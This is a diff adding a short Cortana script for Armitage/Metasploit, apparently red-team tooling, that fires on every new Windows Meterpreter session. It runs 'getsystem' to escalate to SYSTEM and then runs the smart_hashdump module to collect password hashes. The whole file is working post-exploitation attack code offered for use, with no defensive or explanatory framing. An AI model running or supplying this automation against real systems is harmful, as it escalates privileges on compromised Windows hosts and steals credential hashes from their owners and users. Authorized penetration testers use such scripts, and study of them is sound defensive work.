@@ -1,0 +1,17 @@
+# Cortana Script by @christruncer
+# This script will attempt to become system on the box and
+# use metasploit's smart hashdump to gather hashes
+# It performs this action upon every new session
+# Created: 2/18/2013
+
+on session_open {
+        if(!-iswinmeterpreter $1){return;}
+        while(!-isready $1) {}
+        println("Let's jump to SYSTEM!");
+        m_cmd($1, "getsystem");
+        while(!-isready $1) {}
+        println("Ok... Now dump hashes");
+        m_cmd($1, "run post/windows/gather/smart_hashdump");
+        while(!-isready $1) {}
+        println("Hashes have been gathered.");
+}
